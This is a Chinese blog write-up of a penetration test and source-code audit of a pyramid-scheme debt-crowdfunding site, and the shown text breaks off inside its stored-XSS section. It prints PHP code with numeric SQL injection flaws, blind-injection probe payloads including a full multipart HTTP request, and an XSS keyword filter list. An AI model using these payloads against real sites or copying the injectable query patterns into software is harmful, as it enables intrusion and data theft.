<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>渗透传销盘“有钱还系统” | Sxadmin blog</title><meta name="description" content="渗透传销盘“有钱还系统”"><meta name="keywords" content="渗透测试"><meta name="author" content="Sxadmin"><meta name="copyright" content="Sxadmin"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://s1.ax1x.com/2020/06/15/NpA1v6.th.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="渗透传销盘“有钱还系统”"><meta name="twitter:description" content="渗透传销盘“有钱还系统”"><meta name="twitter:image" content="https://sxadmin.github.io/img/cover/cover83.png"><meta property="og:type" content="article"><meta property="og:title" content="渗透传销盘“有钱还系统”"><meta property="og:url" content="https://sxadmin.github.io/2021/08/19/%E6%B8%97%E9%80%8F%E6%9C%89%E9%92%B1%E8%BF%98%E7%B3%BB%E7%BB%9F/"><meta property="og:site_name" content="Sxadmin blog"><meta property="og:description" content="渗透传销盘“有钱还系统”"><meta property="og:image" content="https://sxadmin.github.io/img/cover/cover83.png"><meta property="article:published_time" content="2021-08-19T08:43:24.000Z"><meta property="article:modified_time" content="2021-08-19T08:52:39.207Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://sxadmin.github.io/2021/08/19/%E6%B8%97%E9%80%8F%E6%9C%89%E9%92%B1%E8%BF%98%E7%B3%BB%E7%BB%9F/"><link rel="prev" title="祥云杯wp" href="https://sxadmin.github.io/2021/08/27/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"><link rel="next" title="强网杯wp" href="https://sxadmin.github.io/2021/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='https://s1.ax1x.com/2020/06/15/NpPYfx.jpg'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">96</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">66</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 關於</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-渗透流程简述"><span class="toc-number">2.</span> <span class="toc-text">0x01 渗透流程简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-代码审计"><span class="toc-number">3.</span> <span class="toc-text">0x02 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql注入"><span class="toc-number">3.1.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#储存型xss"><span class="toc-number">3.2.</span> <span class="toc-text">储存型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rce-前后台任意文件上传getshell"><span class="toc-number">3.3.</span> <span class="toc-text">rce 前后台任意文件上传getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-后续"><span class="toc-number">4.</span> <span class="toc-text">0x04 后续</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-总结"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/cover/cover83.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Sxadmin blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 關於</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">渗透传销盘“有钱还系统”</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-08-19 16:43:24"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2021-08-19</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2021-08-19 16:52:39"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2021-08-19</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近通过公安朋友了解到一起传销诈骗案件，涉及的项目叫“有钱还众筹骗局”。</p>
<p>玩法：按照官方的说法，我们注册有钱还这个APP之后，需要支付400元，然后享受众筹还债的权利。比如，你注册了之后，然后拉新三人，这三人每人缴纳400元，则每人可以替你还款200元，即600元。这不是传销么？</p>
<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3637597165,1069734503&fm=26&gp=0.jpg" alt=""></p>
<h3 id="0x01-渗透流程简述"><a href="#0x01-渗透流程简述" class="headerlink" title="0x01 渗透流程简述"></a>0x01 渗透流程简述</h3><p>访问网站，注册了一个账号如下图：</p>
<p><img src="https://s1.ax1x.com/2020/08/17/dZCHk6.png" alt=""></p>
<p>对网站进行ip查询，服务器为香港阿里云服务器，whois也无可利用信息。</p>
<p>接着对网站目录扫描，发现admin.php文件后台，看到此后台可以看到有钱还管理系统，想法：通过关键词，关键特征搜索此源码，对源码进行代码审计。</p>
<p><img src="https://s1.ax1x.com/2020/08/17/dZP6ud.png" alt="image-20200817025949628"></p>
<p>紧接着百度搜索引擎搜索”有钱还源码”，</p>
<p><img src="https://s1.ax1x.com/2020/08/25/dgA26K.png" alt="dgA26K.png"></p>
<p>在网盘搜找到此套系统源码，对源码代码审计。</p>
<p><img src="https://s1.ax1x.com/2020/08/17/dZPB9O.png" alt=""></p>
<p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2307028789,1010550737&fm=26&gp=0.jpg" alt="img"></p>
<hr>
<h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><p>将源码成功搭建后，对此源码进行分析，结果如下：</p>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>\system\mod\index\index.mod.php</p>
<p>news_info函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">news_info</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;post)&#123;</span><br><span class="line">        $n_id = $_POST[<span class="string">'n_id'</span>];</span><br><span class="line">        $news = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">'select * from w_class WHERE id='</span>.$n_id, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($news))&#123;</span><br><span class="line">            $news[<span class="string">'n_img'</span>] = <span class="keyword">$this</span>-&gt;setup_img($news[<span class="string">'n_img'</span>]);</span><br><span class="line">            $news[<span class="string">'n_time'</span>] = date(<span class="string">'Y-m-d H:i'</span>,$news[<span class="string">'n_time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'news'</span>=&gt;$news,</span><br><span class="line">                    <span class="string">'code'</span>=&gt;<span class="number">200</span>,</span><br><span class="line">            ));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'文章信息不存在'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$n_id 参数传入未过滤，可操控sql查询，数字型盲注</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post</span><br><span class="line">http:<span class="comment">//www.xxx.cn//?m=index&amp;c=news_info</span></span><br><span class="line"></span><br><span class="line">n_id=<span class="number">123123123</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>



<p>\system\mod\index\plan.mod.php</p>
<p>plan_add函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">plan_add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;post) &#123;</span><br><span class="line">        $fields = <span class="keyword">$this</span>-&gt;SafeFilter($_POST);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkuser($fields);</span><br><span class="line">        $uid = $fields[<span class="string">'uid'</span>];</span><br><span class="line">        $cash = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">'select * from w_cash where `c_status`=1 AND c_uid='</span>.$uid, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($cash)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">302</span>, <span class="string">'msg'</span> =&gt; <span class="string">'众筹已激活,不能发起还款计划'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fields[<span class="string">'j_price'</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'债务金额无效'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'j_bor_img'</span>])) &#123;</span><br><span class="line">            $fields[<span class="string">'j_bor_img'</span>] = <span class="keyword">$this</span>-&gt;uploads(<span class="string">'j_bor_img'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fields[<span class="string">'j_bor_img'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'债务凭证不能为空'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        $jh = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'j_uid'</span> =&gt; $uid,</span><br><span class="line">            <span class="string">'j_price'</span> =&gt; $fields[<span class="string">'j_price'</span>],</span><br><span class="line">            <span class="string">'j_type'</span> =&gt; $fields[<span class="string">'j_type'</span>],</span><br><span class="line">            <span class="string">'j_bor_img'</span> =&gt; $fields[<span class="string">'j_bor_img'</span>],</span><br><span class="line">            <span class="string">'j_ctime'</span> =&gt; time(),</span><br><span class="line">            <span class="string">'j_status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        );</span><br><span class="line">        $is_res = <span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="string">'w_jihua'</span>, $jh);</span><br><span class="line">        <span class="keyword">if</span> ($is_res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'添加成功'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">302</span>, <span class="string">'msg'</span> =&gt; <span class="string">'添加失败'</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SafeFilter函数过滤sql注入,进入函数</p>
<p>addslashes保护给单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）加上反斜线转义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SafeFilter</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ra = <span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">'/script/'</span>, <span class="string">'/javascript/'</span>, <span class="string">'/vbscript/'</span>, <span class="string">'/expression/'</span>, <span class="string">'/applet/'</span>, <span class="string">'/meta/'</span>, <span class="string">'/xml/'</span>, <span class="string">'/blink/'</span>, <span class="string">'/link/'</span>, <span class="string">'/style/'</span>, <span class="string">'/embed/'</span>, <span class="string">'/object/'</span>, <span class="string">'/frame/'</span>, <span class="string">'/layer/'</span>, <span class="string">'/title/'</span>, <span class="string">'/bgsound/'</span>, <span class="string">'/base/'</span>, <span class="string">'/onload/'</span>, <span class="string">'/onunload/'</span>, <span class="string">'/onchange/'</span>, <span class="string">'/onsubmit/'</span>, <span class="string">'/onreset/'</span>, <span class="string">'/onselect/'</span>, <span class="string">'/onblur/'</span>, <span class="string">'/onfocus/'</span>, <span class="string">'/onabort/'</span>, <span class="string">'/onkeydown/'</span>, <span class="string">'/onkeypress/'</span>, <span class="string">'/onkeyup/'</span>, <span class="string">'/onclick/'</span>, <span class="string">'/ondblclick/'</span>, <span class="string">'/onmousedown/'</span>, <span class="string">'/onmousemove/'</span>, <span class="string">'/onmouseout/'</span>, <span class="string">'/onmouseover/'</span>, <span class="string">'/onmouseup/'</span>, <span class="string">'/onunload/'</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_array($arr)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">                    $value = addslashes($value);                              <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与NUL（NULL字符）加上反斜线转义</span></span><br><span class="line">                &#125;</span><br><span class="line">                $value = preg_replace($ra, <span class="string">''</span>, $value);      <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">                $arr[$key] = $value;                                       <span class="comment">//去除 HTML 和 PHP 标记并转换为HTML实体</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;SafeFilter($arr[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>uid参数传入为数字型，sql拼接，无需单双引号跳出，存在uid数字型注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?m=plan&amp;c=plan_add HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.xxx.cn</span><br><span class="line">Content-Length: <span class="number">3899</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywMcI2Era36okhCec</span></span><br><span class="line"><span class="comment">Origin: http://www.xxx.cn</span></span><br><span class="line"><span class="comment">Referer: http://www.xxx.cn/web/zhaiwu.html?id=2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=ptre19rkv4o2hmatdft3cqfv77</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarywMcI2Era36okhCec</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="uid"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 and 1=123</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarywMcI2Era36okhCec</span></span><br></pre></td></tr></table></figure>



<h4 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h4><p>前台审核储存型xss绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">real_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;post)&#123;</span><br><span class="line">        $fields = <span class="keyword">$this</span>-&gt;SafeFilter($_POST);</span><br><span class="line">        $user   = <span class="keyword">$this</span>-&gt;checkuser($fields);</span><br><span class="line">        $uid    = $fields[<span class="string">'uid'</span>];</span><br><span class="line">        <span class="keyword">if</span>($fields[<span class="string">'m_zsxm'</span>] == <span class="string">''</span>)&#123;<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'真实姓名不能为空'</span>));<span class="keyword">exit</span>();&#125;</span><br><span class="line">        <span class="keyword">if</span>($fields[<span class="string">'m_carid'</span>] == <span class="string">''</span>)&#123;<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'身份证号不能为空'</span>));<span class="keyword">exit</span>();&#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'m_carimg1'</span>]))&#123;</span><br><span class="line">            $fields[<span class="string">'m_carimg1'</span>] = <span class="keyword">$this</span>-&gt;uploads(<span class="string">'m_carimg1'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($fields[<span class="string">'m_carimg1'</span>] == <span class="string">''</span>)&#123;<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请上传身份照片'</span>));<span class="keyword">exit</span>();&#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'m_carimg2'</span>]))&#123;</span><br><span class="line">            $fields[<span class="string">'m_carimg2'</span>] = <span class="keyword">$this</span>-&gt;uploads(<span class="string">'m_carimg2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($fields[<span class="string">'m_carimg2'</span>] == <span class="string">''</span>)&#123;<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">404</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请上传身份照片'</span>));<span class="keyword">exit</span>();&#125;</span><br><span class="line">        $set_sm = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'m_zsxm'</span>   =&gt; $fields[<span class="string">'m_zsxm'</span>],</span><br><span class="line">            <span class="string">'m_carid'</span>  =&gt; $fields[<span class="string">'m_carid'</span>],</span><br><span class="line">            <span class="string">'m_carimg'</span> =&gt; $fields[<span class="string">'m_carimg1'</span>].<span class="string">','</span>.$fields[<span class="string">'m_carimg2'</span>],</span><br><span class="line">        );</span><br><span class="line">        $is_res = <span class="keyword">$this</span>-&gt;db-&gt;update(<span class="string">'w_users'</span>,$set_sm,<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$uid));</span><br><span class="line">        <span class="keyword">if</span>($is_res)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;SetupUser($uid,$fields[<span class="string">'m_zsxm'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'上传成功,等待审核'</span>));<span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">302</span>, <span class="string">'msg'</span> =&gt; <span class="string">'上传失败'</span>));<span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

